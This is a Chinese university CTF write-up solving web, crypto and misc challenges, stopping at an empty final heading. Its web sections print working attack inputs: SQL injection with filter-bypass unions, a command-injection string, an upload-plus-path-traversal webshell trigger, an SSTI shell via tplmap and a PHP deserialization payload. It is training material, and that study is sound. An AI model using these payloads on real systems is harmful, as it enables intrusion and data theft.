# 2021计科网络安全大赛WriteUp

本次比赛共`58`人参赛，一等奖`3`名，二等奖`5`名，三等奖`8`名，优秀奖`5`名。

共计33道题目，其中Web 12题、Crypto 2题、Re 5题、Misc 11题、Pwn 3题

## Web

### 转转转

题目没啥难度，可以通过工具发包，或者写脚本发包，或者 足够幸运！ 再或者 有足够的耐心

flag的抽奖概率在1/450左右

这里演示通过python写脚本得到flag

通过抓包可以发现每次请求都是向data.php发送请求，然后写个脚本

```python
import requests

header = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',
    'Accept': 'application/json, text/javascript, */*; q=0.01'}
while True:
    res = requests.get('url/data.php', headers=header).json()
    flag = res['flag']
    if flag.find('{') != -1:
        print(flag)
        break
    print(flag)
```

![image-20211024225515989](https://i.loli.net/2021/10/24/4IbTqlyMzUQEsvY.png)



### easy_upload

前端过滤了上传的文件后缀名，只允许png,jpg,gif三种图片格式上传。

于是尝试上传的时候使用.jpg文件，然后通过抓包软件拦截住包，修改jpg为php



![image-20211024230943735](https://i.loli.net/2021/10/24/4maVYdIuMCAQncp.png)

返回的是 "图片文件内容格式不对！"，和刚才的报错不一样了，说明前端已经绕过了，但是后端判断了文件里的内容。

![image-20211024230924822](https://i.loli.net/2021/10/24/zvnLYcquPFomsBG.png)

于是尝试把文件内容 改为`GIF89test`，其中`GIF89`是gif的文件头

![image-20211024232050059](https://i.loli.net/2021/10/24/JBubQKcifnNpkAO.png)



![image-20211024232217695](https://i.loli.net/2021/10/24/5i6soW4JEULvmOQ.png)

成功绕过后端，但是要求上传的文件名为：`give_me_flag.php`，于是修改后再次尝试

![image-20211024232412872](https://i.loli.net/2021/10/25/lSB3hIMxYWytXpE.png)

成功上传，但是又提示文件里需要包含`givemeflag`，于是在文件内容改为`GIF89givemeflag`

![image-20211024232608071](https://i.loli.net/2021/10/24/5ngz46VKqlbkrE2.png)

成功得到flag



### fast

payload：

```python
import requests
import re

url = ''

# 将url地址替换为题目地址

s = requests.Session()
r = s.get(url)
# print(r.text)
pattern = re.compile(r"<div style=\"text-align: center;\">(.*[a-z0-9A-Z])</div>")
randomstring = pattern.findall(r.text)
print(f'获取到随机字符串 {randomstring}')
r = s.post(url, data={'randomstring': randomstring})
print(r.text)
pattern_flag = re.compile(r'nynuctf(.*?)[\n]?</div>')
flag = pattern_flag.findall(r.text)
flag = 'nynuctf' + flag[0]
print(f'flag: {flag}')
```

本题的主要考点是requests库的使用

每次访问都会把当前时间加入到session

检测随机生成的数字是否正确，正确后判断当前时间和session中的时间的差是否 > 1s

< 1s 则返回flag



### 实验室粉丝见面会

非常简单的ssti

（随便网上的一篇文章都会讲解原理，这个是最简单最简单的那种，没有加任何过滤，为了方便使用tplmap，主要考察的是打比赛时工具的快速上手）

tplmap一句话就可以跑出来

```
python2 tplmap.py  -u 题目地址 -d 'name' --os-shell
```

拿到shell 

cat flag 拿到flag



### easy_rce

`出题人头昏脑胀的把easy_rce造成了非预期解，现已拉出去挨打了`

这题直接访问 `flag.php`即可获得flag

![image-20211107155917169](https://i.loli.net/2021/11/07/IwchbBJXslz7Eva.png)

### easy_rce2

`出题人紧急补了非预期，于是就有了这题`

这题绕过的方式N多

这里使用`?cmd=system('ca\t fl\ag.php');`来演示

![image-20211107161940771](https://i.loli.net/2021/11/07/QgyxfnBpwCNJR2E.png)



### easySql

首先在源码注释地方知道要传递参数id

[![bq1.png](https://i.loli.net/2021/10/25/dexOKW97jakilZh.png)](https://i.loli.net/2021/10/25/dexOKW97jakilZh.png)

如果耍过sqllib的同学应该很熟悉 那个sql注入靶场就是传递id参数

常规的sql注入

发现传入 union和select后会出现 get out，hack

被过滤了，使用双写绕过 uniounionn selecselectt

这里为什么可以双写饶过呢？

[![bq2.png](https://i.loli.net/2021/10/25/dv4sUz7QWMylNgY.png)](https://i.loli.net/2021/10/25/dv4sUz7QWMylNgY.png)

这里放出题目源码，过滤是把union和select给替换成空了

如果我们输入 uniounionn 这个有unio+union+n组成 替换只进行了一次，将中间的union替换成空的时候 它前边和后边就组合成了新的union。Select也是同理。

所以就正常的sql注入流程就可以

这里还有一点 就是hint1提示的 #传不进去 可以用%23或者--+替代

查字段

```
?id=1’ order by 3--+
```

查看回显位置

```
?id=1' uniounionn seleselectct 1,2,3--+
```

[![bq3.png](https://i.loli.net/2021/10/25/aAifEBFrv54TDMY.png)](https://i.loli.net/2021/10/25/aAifEBFrv54TDMY.png)

回显位置是2,3

查询数据库

```
?id=1' uniounionn seleselectct 1,2,database()--+
```

得到数据库名ctf

爆ctf库中得到数据表

```
?id=1%27%20uniounionn%20seleselectct%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27ctf%27%20--+
```

得到flag,users

爆字段

```
?id=1%27%20uniounionn%20seleselectct%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27flag%27%20--+
```

得到id flag value

查询vlaue字段

```
?id=1%27%20and%201=1%20ununionion%20selselectect%201,2,value%20from%20flag--+
```

[![bq4.png](https://i.loli.net/2021/10/25/msVODZF4IAtEyXa.png)](https://i.loli.net/2021/10/25/msVODZF4IAtEyXa.png)



### upload_plus

这道题考察的是文件上传和文件包含漏洞相结合的

首先由个上传功能 限制只能上传图片

可以上传图片马

然后图片马只有被解析成php代码才可以被执行

然后就需要文件包含这个漏洞了

文件包含相当于把另一个文件中的东西包含到本文件中

那么就相当于把图片马当中的一句话木马放进了首页当中

上传图片马会返回`uploads/2020/11/09/1326715fa921273da26372524540.png`

下边的文件包含可以看到是`?filename=1.php&submit=提交`

Filename这个参数是文件名

如果扫描目录的话会发现

有一个include目录和uploads目录

文件包含只包含include目录里的文件 怎么包含upload里的呢？

Linux中 .. 表示上层目录

那就可以使用

```
filename=../uploads/2020/11/09/1326715fa921273da26372524540.png
```

使用命令读取flag

```
?filename=../uploads/2020/11/09/1326715fa921273da26372524540.png&submit=提交&pass=echo%20system(%27cat flag.php%27);
```

如果这里有同学可以执行phpinfo() 但是执行system没有回显 可以加上echo试试



### unserialize

分析源码可知最终需要调用WeiShen类的__call方法

call方法是魔术方法具体使用可查百度

大致就是当调用这个类的不存在方法时会调用call方法

需要利用到NynuSecUser类的__destruct方法 如果pwd==‘two’就会调用$this->rainy->getFlag();  

把rainy设置成WeiShen类的对象 就满足刚刚的call方法调用

需要设置pwd=‘two’

payload:

```php
<?php
class NynuSecUser
{
    public function __construct()
    {
        $this->pwd='two';
        $this->rainy = new WeiShen();
    }
}
class WeiShen
{
    public function __construct()
    {
        $this->cmd="echo system('cat flag.php');";
    }
}
$a=new NynuSecUser();
echo base64_encode(serialize($a));

```



### 简单的PHP黑魔法

GET：`url?L1=2022A&L2=2e6&L3=s878926199a&L4[]`

POST：`L5=file_get_contents(%27flag.php%27)`



### 俄罗斯方块

> 小明从网上找了个node.js写的俄罗斯方块来学习这门语言，他想让你帮忙测一下bug，所以找个朋友一起玩吧

打开题目，尝试玩一下，但是并不能得到flag。

![file](https://i.loli.net/2021/11/04/KGewpRxJB9FYV3l.png)

尝试搜索网站流量，发现flag。（当然一个一个js文件看过去，也可以找到flag）

![file](https://i.loli.net/2021/11/04/igPc7WlaL5ImvZu.png)

> `nynuctf{9cbe2fe1-459e-424f-8442-73864b5f7e0e}`



### 俄罗斯方块2

> 小明感觉找的俄罗斯方块项目不太好，于是自己跟着百度魔改了一番，你能找到百度给他设下的陷阱吗？

下载附件打开发现是个`Node.js`写的项目，而且项目本身结构非常简单，主要的服务器端代码都在`wsServer.js`里，那就现场审计一下代码看看有没有哪里有题目描述里的漏洞呗，反正也不长。

其中`17`行的`sendFile`上网查了下是读文件然后直接把内容当作http response返回的一个函数，而后面的参数设定了根目录是“真·根目录”，所以猜测可能存在路径穿越漏洞。

![file](https://i.loli.net/2021/11/04/tZUgyoNXpWH6Rjr.png)

而上面`16`行给出的url匹配规则`/^\/(.*)$/`看着应该是任意匹配，所以直接发包来穿越就完事了。

![file](https://i.loli.net/2021/11/04/hrnC8lqBaz12gcd.png)

三层穿越成功到根目录，在根目录下尝试访问`flag`文件，确实就存在这个文件，拿到flag。

![file](https://i.loli.net/2021/11/04/JurHTdYatXcegDG.png)

> `nynuctf{fd5622c2-65ce-4f06-bf38-8cb6660d0db4}`



## Crypto

### 小套不算套

> 又有谁会喜欢套娃呢

```python
from Crypto.Util.number import getPrime, bytes_to_long
import gmpy2

flag = 'nynuctf{}'


p1 = q1 = 2
while gmpy2.gcd(p1, q1) > 1:
    p1, q1 = getPrime(528), getPrime(528)
n1 = p1 * q1
print 'n1', n1
e1 = 3
m = bytes_to_long(flag.encode())
c1 = pow(m, e1, n1)


p2 = q2 = 2
while gmpy2.gcd(p2, q2) > 1:
    p2, q2 = getPrime(1536), getPrime(1536)
n2 = p2 * q2
e2 = 2
c2 = pow(c1, e2, n2)


p3 = q3 = 2
while gmpy2.gcd(p3, q3) > 1:
    p3, q3 = getPrime(2048), getPrime(2048)
n3 = p3 * q3
print 'n3', n3
print 'phi3', (p3 - 1) * (q3 - 1)
e3 = 0x10001
c3 = pow(c2, e3, n3)
print 'c3', c3
```

```
n1 604679512138617037843063400335852277917759302720680757801819343322169177317789639211717686519352704962708383679383874632838218844139645603288642990840752333972443512630475955756086004231475765696973696131487596242445439165181095216174429784632070450967063006140391578931127355859533792899253464689363815381795168313503
n3 605055878372508659676243384242840171922803407745927889333403217590833029593186049316655833944054204772483742311537270336283726456567851960238984335894732161805719594573704232467445060696113487989356926170339811796199759506714245536306218678252087409304456227687445286536076629748809411034191207322261695460065165329444731219403842505545611573036835443275197791772926099794731941883828365810588287276293635083495551507872196763651636227694774692475359076829028588696268362541767117043973924870884819281159718572295523803790090331205083709776619026466272100170203939354595671670324830890955147819218073640781240429898090026155800401889855948072985858399359059973196171290916969047388694246182359592873395232715797387440591485855737385274155865766241539538710094459175174935203710487492509079181723902762151796855770263950429639983975161542766636262534207994237518181710680431590476340998277228368179472986060551251083494674072755785751483453007724993223512207176889859802141805609149657594197156083212552763077625361971903236767541710781284443023604073960179717433479314923872274040608354025603363345960937224129208917707673141769602477676334678614064197130488059615306448523382958107583619911308435777025824549184573820678078139378739
phi3 605055878372508659676243384242840171922803407745927889333403217590833029593186049316655833944054204772483742311537270336283726456567851960238984335894732161805719594573704232467445060696113487989356926170339811796199759506714245536306218678252087409304456227687445286536076629748809411034191207322261695460065165329444731219403842505545611573036835443275197791772926099794731941883828365810588287276293635083495551507872196763651636227694774692475359076829028588696268362541767117043973924870884819281159718572295523803790090331205083709776619026466272100170203939354595671670324830890955147819218073640781240429898040662131328106659269273774105916574867304674626061851831362048231718352243126715551295843283377408818674678883183179790838882214957052450442885340172972631724071931315847478985544928543826083076508277878236069428981558024389331697858008111459401503722600768494092049635892205156578221982816458483056953911633992323031135854838076376320255562147660236872050082586440292774501951487433098408747367938592035325909968200202105477423671484317329656229612679427021005927153806023049469174867371041650312201053679798051395337188576388471201610830648982576662799540956157751327643617415141153629744654048608422412113161878960
c3 106351257973282745941665962397626936564168883294581344491779632553904183648939623676408600341073829156669397631007030668746554814412628364166142281125468006806192884570556136169032498162503036909219400101088505750490547854485185592212645579837078378103565177193493021758823429987283912945197072388110214454801483070074179527395624125803374738269717301610348492176096694112359872218239320730828131295845343393848922150426817245583471589893162625107977464516923456502007233486278209128922310964121738505634129230059288253326534725279557951814310134100027687548843574040633696080654448225452704223200751760729610514450654444951178264858006501607221747736201824081794336627431237757829179356680240702760034332019410734739584733614125058936964793528944542247469523044554056525196062870877857736080620248868792701860965421232498063304949116576182107000194458988717884477180986558333448301624307658715353417703946565901282040503107350279128921487379888973793514845292657792853966551808406851630366473275214483984032361000955379563193550225545278071737062016390831939489083903885712743216674186329437120304483236948402633406378339327883657142305811123073649756850337287774356194079200381437590705869887664560971395091190692570860450948126634
```

拿到题目发现是给rsa套娃，套了三层不一样的攻击缺陷，其特征从里到外（从上到下）分别是：`e=3`、`e=2`、`φ(n)`已知，都是十分常见的基础攻击手法，所以直接依次用对应脚本进行解rsa并将数据关系串起来即可。

```python
# coding=UTF-8
import gmpy2
from Crypto.Util.number import long_to_bytes

n1= 604679512138617037843063400335852277917759302720680757801819343322169177317789639211717686519352704962708383679383874632838218844139645603288642990840752333972443512630475955756086004231475765696973696131487596242445439165181095216174429784632070450967063006140391578931127355859533792899253464689363815381795168313503
n3= 605055878372508659676243384242840171922803407745927889333403217590833029593186049316655833944054204772483742311537270336283726456567851960238984335894732161805719594573704232467445060696113487989356926170339811796199759506714245536306218678252087409304456227687445286536076629748809411034191207322261695460065165329444731219403842505545611573036835443275197791772926099794731941883828365810588287276293635083495551507872196763651636227694774692475359076829028588696268362541767117043973924870884819281159718572295523803790090331205083709776619026466272100170203939354595671670324830890955147819218073640781240429898090026155800401889855948072985858399359059973196171290916969047388694246182359592873395232715797387440591485855737385274155865766241539538710094459175174935203710487492509079181723902762151796855770263950429639983975161542766636262534207994237518181710680431590476340998277228368179472986060551251083494674072755785751483453007724993223512207176889859802141805609149657594197156083212552763077625361971903236767541710781284443023604073960179717433479314923872274040608354025603363345960937224129208917707673141769602477676334678614064197130488059615306448523382958107583619911308435777025824549184573820678078139378739
phi3= 605055878372508659676243384242840171922803407745927889333403217590833029593186049316655833944054204772483742311537270336283726456567851960238984335894732161805719594573704232467445060696113487989356926170339811796199759506714245536306218678252087409304456227687445286536076629748809411034191207322261695460065165329444731219403842505545611573036835443275197791772926099794731941883828365810588287276293635083495551507872196763651636227694774692475359076829028588696268362541767117043973924870884819281159718572295523803790090331205083709776619026466272100170203939354595671670324830890955147819218073640781240429898040662131328106659269273774105916574867304674626061851831362048231718352243126715551295843283377408818674678883183179790838882214957052450442885340172972631724071931315847478985544928543826083076508277878236069428981558024389331697858008111459401503722600768494092049635892205156578221982816458483056953911633992323031135854838076376320255562147660236872050082586440292774501951487433098408747367938592035325909968200202105477423671484317329656229612679427021005927153806023049469174867371041650312201053679798051395337188576388471201610830648982576662799540956157751327643617415141153629744654048608422412113161878960
c3= 106351257973282745941665962397626936564168883294581344491779632553904183648939623676408600341073829156669397631007030668746554814412628364166142281125468006806192884570556136169032498162503036909219400101088505750490547854485185592212645579837078378103565177193493021758823429987283912945197072388110214454801483070074179527395624125803374738269717301610348492176096694112359872218239320730828131295845343393848922150426817245583471589893162625107977464516923456502007233486278209128922310964121738505634129230059288253326534725279557951814310134100027687548843574040633696080654448225452704223200751760729610514450654444951178264858006501607221747736201824081794336627431237757829179356680240702760034332019410734739584733614125058936964793528944542247469523044554056525196062870877857736080620248868792701860965421232498063304949116576182107000194458988717884477180986558333448301624307658715353417703946565901282040503107350279128921487379888973793514845292657792853966551808406851630366473275214483984032361000955379563193550225545278071737062016390831939489083903885712743216674186329437120304483236948402633406378339327883657142305811123073649756850337287774356194079200381437590705869887664560971395091190692570860450948126634

e1 = 3
e2 = 2
e3 = 0x10001

d3 = gmpy2.invert(e3, phi3)
c2 = m3 = pow(c3, d3, n3)
print c2

c1 = m2 = int(gmpy2.iroot(c2, e2)[0])
print c1

for k in xrange(200000000):
    if gmpy2.iroot(c1 + n1 * k,3 )[1]==1:
        m1 = gmpy2.iroot(c1 + n1 * k, 3)[0]
        break

print long_to_bytes(m1)
```

![file](https://i.loli.net/2021/11/04/WvzwxnaCPt8FhgQ.png)

> `nynuctf{30cc9a81-24e6-4769-891e-dbf19d030760}`



### 混元形意太极门

> 小明由于攻击马老师的电脑被马老师抓起来了，你打算去救他，马老师自创的松果弹抖闪电鞭加密能挡得住你吗？

```python
flag = bytearray(b"nynuctf{}")

n = len(flag)

assert n == 45

for i in range(n):
    flag[i] ^= i
    flag[i] ^= 10
    flag[i] ^= 24

for i in range(n // 2):
    tmp = flag[i]
    flag[i] = flag[n - 1 - i]
    flag[n - 1 - i] = tmp

for i in range(n-1):
    flag[i] ^= flag[i+1]

print(flag.hex())
```

```
1f5c0b06595554025001040123185306064e1b060b031a150957004e5650070206510102161c1116111a14167c
```

拿到题目发现加密脚本主要就三段处理过程，分别是：每位`x ⊕ i ⊕ 10 ⊕ 24`、整段逆置、除最后一位外每位`x(i)=x(i) ⊕ x(i+1)`，所以其实整个倒着写就是解密脚本了。

而最后一步的倒着写就是从倒数第二位开始从后往前再做一次异或（因为一个数的异或的异或就是这个数本身）：

```python
for i in range(n-2, -1, -1):
    flag[i] ^= flag[i+1]
```

中间那步的话，代码原封不动抄下来就行，因为逆置没有所谓正向反向，逆置的逆置不就回来了嘛：

```python
for i in range(n // 2):
    tmp = flag[i]
    flag[i] = flag[n - 1 - i]
    flag[n - 1 - i] = tmp
```

然后第一步的倒着写的话，也是原封不动抄下来就行，因为用的也是异或嘛，再异或一遍就回来了：

```python
for i in range(n):
    flag[i] ^= i
    flag[i] ^= 10
    flag[i] ^= 24
```

所以最后脚本就写出来了，跑就完事。

```python
flag = bytearray(bytes.fromhex('1f5c0b06595554025001040123185306064e1b060b031a150957004e5650070206510102161c1116111a14167c'))

n = 45

for i in range(n-2, -1, -1):
    flag[i] ^= flag[i+1]
for i in range(n // 2):
    tmp = flag[i]
    flag[i] = flag[n - 1 - i]
    flag[n - 1 - i] = tmp
for i in range(n):
    flag[i] ^= i
    flag[i] ^= 10
    flag[i] ^= 24
print(flag)
```

![file](https://i.loli.net/2021/11/04/o5gNkH9YBIKZalm.png)

> `nynuctf{bac3215d-ba79-4625-bcd4-1166ab5a708e}`



## Misc

### sign in

![image-20211024233651655](https://i.loli.net/2021/10/24/npSkKVMdzm4vaOE.png)

直接打开图片，提示出错(用自带`照片`程序看的话 不会提示出错)，于是猜到可能是png高度不对

![image-20211024233707535](https://i.loli.net/2021/10/25/PxEH4NDzmnr7LG2.png)

用010 Editor打开图片，找到crc，用脚本跑一下，得到宽和高都是 487

![image-20211024234217180](https://i.loli.net/2021/10/25/ntg1m9jp48KaFOx.png)



![image-20211024234139071](https://i.loli.net/2021/10/25/Xr3wkFg7q2xdtNz.png)

```python
import os
import binascii
import struct

crcbp = open("sign in.png", "rb").read()    #打开图片
for i in range(2000):
    for j in range(2000):
        data = crcbp[12:16] + \
            struct.pack('>i', i)+struct.pack('>i', j)+crcbp[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        if(crc32 == 0x820D9554):    #图片当前CRC
            print(i, j)
            print('hex:', hex(i), hex(j))
```

于是修改高度为487

![image-20211024234332674](https://i.loli.net/2021/10/24/mwscfMlx1T4Xpri.png)



![image-20211024234347425](https://i.loli.net/2021/10/24/9y5TQR6SOe8ngNa.png)

得到flag

> `nynuctf{w3lcome_t0_nynuctf}`

当然在真实做题的情况下，完全尝试直接给高度设置一个值，来看看是否为高度隐写

例如本题我直接将高度改为500，虽然crc不正确，但是能直接得到flag

![image-20211024234946901](https://i.loli.net/2021/10/25/Hy4v3EfZqwC1ApJ.png)

![image-20211024235010283](https://i.loli.net/2021/10/24/GdWouUnOIHNSe41.png)



### morse_code

打开压缩包发现需要密码

根据题目描述

`出题人睡了一觉，醒来只记得 "zip_1s"了，还差最后五位字符，你能帮帮他吗？提交时套上nynuctf{}`

猜测是掩码攻击，于是将掩码设置为`zip_1s?????`，使用ARCHPR工具暴力枚举得到解压密码

![image-20211025000216510](https://i.loli.net/2021/10/25/35pAMr7vXI6tyYe.png)

![image-20211025000225943](https://i.loli.net/2021/10/25/ZVjOxizuWbekSI7.png)

打开flag.txt得到

`11 11111 010 000 0 001101 1010 11111 100 0 001101 01111 000 001101 0 01 000 1011`

根据题目名，猜测是摩斯密码，但是莫斯密码是由`.`和`-`以及分隔符组成的，现在只有0和1

于是将`0`替换成`.`，将`1`替换成`-`，得到

`-- ----- .-. ... . ..--.- -.-. ----- -.. . ..--.- .---- ... ..--.- . .- ... -.--`

使用[在线工具](http://www.zhongguosou.com/zonghe/moersicodeconverter.aspx)转码得到

M0RSEC0DE1SEASY

套上nynuctf{}得到flag

> `nynuctf{M0RSEC0DE1SEASY}`



### 眼巴巴

题目是一张图片，先丢到010看一下，没发现异常

![image-20211025003223070](https://i.loli.net/2021/10/25/iOpFqYR5rs9TMec.png)

再尝试 用StegSolve

![image-20211025003448900](https://i.loli.net/2021/10/25/sTJ5EW9kKaZXqxB.png)

发现在Red、Green、Blue的plane 0 时，图片最上方都会有一行整齐的黑色像素点

于是尝试分离

![image-20211025003632431](https://i.loli.net/2021/10/25/fiDVbGoYqnkQFLS.png)

但好像有东西，但又不完全有，再次尝试不同的Bit Plane Order，当尝试到BGR的时候发现有一串01的字符串

![image-20211025003737010](https://i.loli.net/2021/10/25/zLJ63KUrZDHfTOh.png)

将01字符串复制出来

`0110111001111001011011100111010101100011011101000110011001111011011101110110010100110001011000110011000001101101011001010101111101101110011110010110111001110101011000110111010001100110010111110111001000110100011000110110010101111101`

猜测是二进制数据，

于是尝试用[在线工具](https://coding.tools/cn/binary-to-text)将字符串转ascii文本，得到flag：

![image-20211025004438542](https://i.loli.net/2021/10/25/zZe3nO5sLap9NxT.png)

> `nynuctf{we1c0me_nynuctf_r4ce}`



### 勇敢牛牛

打开文档，把图片移开，提示flag不在这，于是尝试打开 `隐藏文字` 选项

![image-20211025001701134](https://i.loli.net/2021/10/25/xrY4B5tcqhbo23s.png)

![image-20211025001819310](https://i.loli.net/2021/10/25/u8JNF5gpk9Eiw6K.png)

![image-20211025002937323](https://i.loli.net/2021/10/25/O9MbQNsLXclvUoj.png)

得到 `pass：iampass`

还不知道有什么用，先保存下来。

接着将文件的`.docx`后缀改为`.zip`（或者使用foremost工具分类，也会得到一个zip文件）

![image-20211025002153384](https://i.loli.net/2021/10/25/mIPSlAVOXvsnjZY.png)



在`/word/media`目录下发现`flag.bmp`，现在有 bmp文件和一个密码，于是立即想到wbStego4.3

选择好文件，输入密码`iampass`

![image-20211025002447036](https://i.loli.net/2021/10/25/b1WxIMhz9QNCga7.png)

再输入要保存的文件名，`flag.txt`

![image-20211025002518920](https://i.loli.net/2021/10/25/ns8LKy5ip4QV3PG.png)

得到flag：

> `nynuctf{niuniu_chongchongchong}`



### 我裂开了

压缩包需要密码，爆破后无果，猜测是伪加密

伪加密的话，mac系统、kali系统、360压缩等 有时候可以无视伪加密。

伪加密可以通过手动修改标识符或者使用工具，这里演示一下使用工具去除伪加密，如果想要了解伪加密的原理或者手动去除伪加密可以自行寻找相关资料

用到的工具`ZipCenOp.jar`（需要java环境）

在命令行执行以下命令去除伪加密

`java -jar ZipCenOp.jar r 我裂开了.zip`

![image-20211025005355563](https://i.loli.net/2021/10/25/C34VtHqWSRw9cNA.png)

再次打开压缩包，发现可以正常解压了

解压后得到一张gif图

![image-20211025005501367](https://i.loli.net/2021/10/25/QjAbDe4kPUzX6c2.png)

但是打开图片却提示图片出错了，于是将图片丢到010里看看

![image-20211025010504097](https://i.loli.net/2021/10/25/du61KiyD9xUAW3V.png)

发现并没有gif的文件头，于是手动加上`474946383961`

![image-20211025010822333](https://i.loli.net/2021/10/25/CzmPqZfTurMK4Lg.png)

再次打开图片，正常了

![image-20211025010854402](https://i.loli.net/2021/10/25/GI7vgqxefkhWnDN.png)

仔细观察发现gif动画里，有什么东西一闪而过

于是用ScreenToGif工具(其他工具也都可以)分解一下gif

发现在33帧的时候有不同的图

![image-20211025011055903](https://i.loli.net/2021/10/25/Rmv82PW7YSbpgZJ.png)

 有个二维码，用工具CQR扫一下，得到

![image-20211025011208995](https://i.loli.net/2021/10/25/DcAg2jp7da9boUT.png)

```
DL$,B@ru=0@VKIfDdRcDF^J`8DId*/FF=
```

根据题目描述和背景图的`85`，联想到可能是base85编码，于是使用[在线工具](http://www.atoolbox.net/Tool.php?Id=934)解码得到flag：

![image-20211025011513130](https://i.loli.net/2021/10/25/tFcZ6185uIrA9Vn.png)

![image-20211025011513130](https://i.loli.net/2021/10/25/tFcZ6185uIrA9Vn.png)

> `nynuctf{biggo_y0u_f1nd_1t}`



### flag去哪了？

将gif图片丢进010，发现gif图片结束后还有一些数据

![image-20211025012029537](https://i.loli.net/2021/10/25/IlSo9mQ7Xt3FTqD.png)

将这些数据提取出单独一个文件

根据多处，观察到文件内容被翻转

![image-20211025012238180](https://i.loli.net/2021/10/25/Of4ldJcSVTjWQZN.png)

于是写脚本翻转回来

![img](https://i.loli.net/2021/10/25/BwknQfvha76IxSY.jpg)

```python
with open('fz','rb') as f:
   with open('flag','wb') as g:
      g.write(f.read()[::-1])
```

翻转后将”flag”丢进010

看到![img](https://i.loli.net/2021/10/25/uIV6QW9ZgbXzBpo.jpg)，

再往下拉看到PK，就直接丢foremost跑一下

![img](https://i.loli.net/2021/10/25/lxhsMDn1HSF8eB5.jpg) 

一个png文件夹一个zip文件夹

 

打开压缩包，又是一堆压缩包，打开子压缩包发现是一个图片，每个子压缩包都是一张图片，而且序号都是15X15，于是猜测为15X15的图。

写脚本解压图片：

![img](https://i.loli.net/2021/10/25/4cEVRbQnMhdim1L.jpg) 

```python
import zipfile

for i in range(15):
    for ii in range(15):
        path = f'flag_{i}_{ii}.zip'
        zip_file = zipfile.ZipFile(path)
        zip_list = zip_file.namelist()  # 得到压缩包里所有文件
        for f in zip_list:
            zip_file.extract(f,'.') #循环解压文件到指定目录

        zip_file.close()  # 关闭文件，必须有，释放内存
```

写脚本拼图：

![img](https://i.loli.net/2021/10/25/XuG152cETUNsKpC.jpg) 

```python
# coding:utf-8
import PIL.Image as Image
import os

IMAGES_PATH = './flag/'  # 图片集地址
IMAGE_WIDTH = 64  # 每张小图片的宽度
IMAGE_HEIGHT = 64  # 每张小片的高度
IMAGE_ROW = 15  # 图片间隔，也就是合并成一张图后，一共有几行
IMAGE_COLUMN = 15  # 图片间隔，也就是合并成一张图后，一共有几列
IMAGES_FORMAT = ['.jpg', '.JPG', '.png', '.PNG']  # 图片格式
IMAGE_SAVE_PATH = 'final.png'  # 图片转换后的地址

# 获取图片集地址下的所有图片名称
image_names = [name for name in os.listdir(IMAGES_PATH) for item in IMAGES_FORMAT if os.path.splitext(name)[1] == item]
# 排序(当前为修改时间序)
image_names = sorted(image_names, key=lambda x: os.path.getmtime(IMAGES_PATH + x))
# 简单的对于参数的设定和实际图片集的大小进行数量判断
if len(image_names) != IMAGE_ROW * IMAGE_COLUMN:
    raise ValueError("合成图片的参数和要求的数量不能匹配！")


# 定义图像拼接函数
def image_compose():
    to_image = Image.new('RGB', (IMAGE_COLUMN * IMAGE_WIDTH, IMAGE_ROW * IMAGE_HEIGHT))  # 创建一个新图
    # 循环遍历，把每张图片按顺序粘贴到对应位置上
    for y in range(1, IMAGE_ROW + 1):
        for x in range(1, IMAGE_COLUMN + 1):
            from_image = Image.open(IMAGES_PATH + image_names[IMAGE_COLUMN * (y - 1) + x - 1]).resize(
                (IMAGE_WIDTH, IMAGE_HEIGHT), Image.ANTIALIAS)
            to_image.paste(from_image, ((x - 1) * IMAGE_WIDTH, (y - 1) * IMAGE_HEIGHT))
    return to_image.save(IMAGE_SAVE_PATH)  # 保存新图


image_compose()  # 调用函数
```



得到：

 

![img](https://i.loli.net/2021/10/25/LbyfX3x4pFYRvDo.jpg) 

 

得到flag

nynuctf{3f8d190507f82cf6e78758b656130aff4f4080244484ec88b4acc3a42dbcf1f10b3ba5ad262f8d190507f14085a1efccdd1d}

 

### 学长的爱护

五次栅栏六次凯撒然后ook？解码，得到base32，解码得到base64，放到winhex转换base64保存得到图片二维码，扫码得flag：

> `nynuctf{Welc0me_nYnu_ctF}`

 

### 南方姑娘

图片分离得到压缩包，图片名字是压缩包密码，打开压缩包的到音频，用mp3stego解密，密钥在图片属性备注里，得到aes密文，打开silenteye把图片放进去解密得到aes密钥，解密aes得到flag：
> `nynuctf{meng_li_shen_mo_dou_y0u}`



### 简单题保命

打开附件，发现是猪圈密码

![image-20211107163730401](https://i.loli.net/2021/11/07/bCdagcU9wWQHEv8.png)

使用[在线网站](http://www.metools.info/code/c90.html)解密

![image-20211107163935492](https://i.loli.net/2021/11/07/t4YrmzguAIHVNPF.png)

得到解压密码：`jiandanba`

![image-20211107164025090](https://i.loli.net/2021/11/07/tIf1BX9YTZzdxhO.png)

猜测是 emoji编码

![image-20211107164237424](https://i.loli.net/2021/11/07/Ukf7dzgG93nY2pB.png)

去[在线网站](http://www.atoolbox.net/Tool.php?Id=937)解密得到flag

> `nynuctf{给你介绍两个女朋友！！！}`



### 我是带黑阔

> 带黑阔小明上php课时找到了马老师的电脑ip，打算入侵一下他的电脑看看有啥好玩的东西。可是没想到马老师居然在学生机上开了流量记录，所以小明被逮住了，但他宁死不屈，你能分析一下小明的行为来帮小明辩护吗？

下载附件得到一个`.saz`文件，右键发现识别成了压缩包，打开发现有注释，根据其意思这个文件应该是`Fiddler`打包出来的会话文件。

![file](https://i.loli.net/2021/11/04/qvHVfguAmLZUjiN.png)

![file](https://i.loli.net/2021/11/04/z2Zrds3wWTSA8qk.png)

所以使用`Fiddler`打开。

![file](https://i.loli.net/2021/11/04/REfYokaSBvGm368.png)

发现有600+的数据包，不过其实大部分都是B站相关的数据包，应该和题目无关（毕竟出题人哪有能力控制B站的服务器呀），大致浏览一下发现有几个内网的流量，应该是题目相关的东西。

![file](https://i.loli.net/2021/11/04/NpUvuczWAahsyZF.png)

所以尝试筛选看看能剩下多少。

![file](https://i.loli.net/2021/11/04/h8vPSX3EtjwUZce.png)

只剩下9条数据，那就从下往上看呗。（一般流量分析题越后面越接近flag）

发现倒数第二条数据包里面就有flag返回。

![file](https://i.loli.net/2021/11/04/mHOxE2XuJvr19sh.png)

> `nynuctf{9d5e7c0e-66ab-4619-9ade-2dbdee9a3ee1}`



### 我是带黑阔2

